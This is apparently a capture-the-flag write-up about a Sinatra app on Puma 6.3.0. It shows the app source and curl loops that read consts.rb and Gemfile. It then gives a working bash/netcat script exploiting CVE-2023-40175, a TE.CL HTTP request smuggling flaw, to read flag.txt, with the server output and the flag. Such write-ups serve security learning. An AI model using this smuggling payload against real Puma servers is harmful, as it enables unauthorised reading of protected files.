---
layout: post
category: challenge
title: '[Weekly Challenge] Durgahayu'
---

```
Points: 17
Author: dwisiswant0
```

## Description

Aku merdeka sejak lahir, bahkan sejak dalam rahim\[1\].

## Hints

\[1\]: Proxy.

## Steps to Resolve

In this challenge, we were handed a file called `app.rb` containing several routes. The server is powered by Puma, with Sinatra as the framework of choice.

```ruby
require 'puma'
require 'sinatra'
require_relative 'consts'

before "/#{FLAG_FILE}" do
  halt 403
end

not_found do
  status 404
  body 'gada bro'
end

get '/' do
  'Hello, world!'
end

get '/ping' do
  'pong'
end

set(:probability) { |value| condition { rand <= value } }

post '/read/:file', :probability => 0.25 do
  filename = params[:file]
  filepath = File.join(settings.cwd, filename)

  unless filepath.start_with?(settings.cwd)
    halt 403, 'yang bener aja'
  end

  if File.exist?(filepath) && File.file?(filepath)
    content_type 'text/markdown'
    "baik tuan, nih pesanannya 👇\n" +
    "```\n" +
    "#{File.read(filepath)}\n" +
    "```"
  else
    halt 404
  end
end

post '/read/:file' do
  status 418
  headers \
    "Refresh" => "Refresh: 1; /"
  body 'kok nyasar ke sini, ngab?'
end
```

The routes are fairly simple, including a root path, a `/ping` endpoint, a custom 404 handler, a handler that blocks `/#{FLAG_FILE}`, and a dynamic route `/read/:file`. However, to access the value of `FLAG_FILE`, we need to read the file that was included with `require_relative 'consts'`. 

The dynamic `/read/:file` route lets us do this, but with a catch: there's a 25% chance of success, as indicated by the probability condition. This means that for every request we send, only 1 in 4 attempts will hit the right handler, while the rest will fall through to a default handler that returns an HTTP 418 status.

#### Step 1: Extracting `FLAG_FILE`

Our first goal is to extract the value of `FLAG_FILE` from `consts.rb`. By using a simple loop to repeatedly send POST requests until we succeed, we can eventually access the file's contents:

```bash
$ while :; do curl -X POST http://durgahayu-chall.skill-issue.org/read/consts.rb | grep -o "FLAG_FILE.*" && break; done
FLAG_FILE = 'flag.txt'
```

Success! Now we know that the flag file we need is `flag.txt`.

#### Step 2: Reading `Gemfile` to Identify the Server & Framework

With the name of the flag file in hand, trying to read it via the `/read/:file` route will always result in a 401 status, so we need to try something else. Let's inspect the `Gemfile` to figure out the specific versions of Puma and Sinatra in use:

````bash
$ while :; do curl -X POST http://durgahayu-chall.skill-issue.org/read/Gemfile | grep -v "kok nyasar" && break; done
baik tuan, nih pesanannya 👇
```
source "https://rubygems.org"

gem "puma", "6.3.0"
gem "sinatra", "~> 4.0"
```
````

Looks like Puma version 6.3.0 is in play here, and that's important because this particular version has a known vulnerability, CVE-2023-40175.

#### Step 3: Understanding the Vulnerability (CVE-2023-40175)

CVE-2023-40175 is a vulnerability in Puma versions before 6.3.1 that allows for **HTTP request smuggling**. Specifically, the server doesn't handle chunked transfer encoding and zero-length Content-Length headers correctly (TE.CL), which opens up the possibility for a request smuggling attack.

#### Step 4: Crafting the Exploit

With this information, let’s write an exploit to take advantage of this vulnerability:

```bash
#!/bin/bash

TARGET_HOST="durgahayu-chall.skill-issue.org"
TARGET_PORT="80"

payload="GET / HTTP/1.1
Host: $TARGET_HOST:$TARGET_PORT
Transfer-Encoding: chunked

0
X:POST /read/flag.txt HTTP/1.1
"

payload=$(sed 's/$/\r/g' <<< "${payload}")

while [[ true ]]; do
    try=$(nc -w 1 $TARGET_HOST $TARGET_PORT <<< "${payload}")

    if [[ "${try}" =~ "baik tuan" ]]; then
        echo -e "${try}"
        break
    fi
done
```

This script keeps sending an HTTP request smuggling payload using `netcat`. The payload is designed to send in a POST request to `/read/flag.txt`. Once we get a response that contains **"baik tuan"**, we know we've successfully read the file, and the loop breaks.

#### Step 5: Retrieving the Flag

Now, let's run the script and see the result:

````bash
$ bash CVE-2023-40175.sh
HTTP/1.1 200 OK
content-type: text/plain;charset=utf-8
x-content-type-options: nosniff
Content-Length: 13

Hello, world!HTTP/1.1 200 OK
content-type: text/markdown;charset=utf-8
x-content-type-options: nosniff
Content-Length: 68

baik tuan, nih pesanannya 👇
```
Dirg@hayuRepvblikInd0nesia-79
```
````

And there it is! We've successfully exploited the vulnerability and retrieved the flag.

## References

* [GHSA-68xg-gqqm-vgj8](https://github.com/puma/puma/security/advisories/GHSA-68xg-gqqm-vgj8)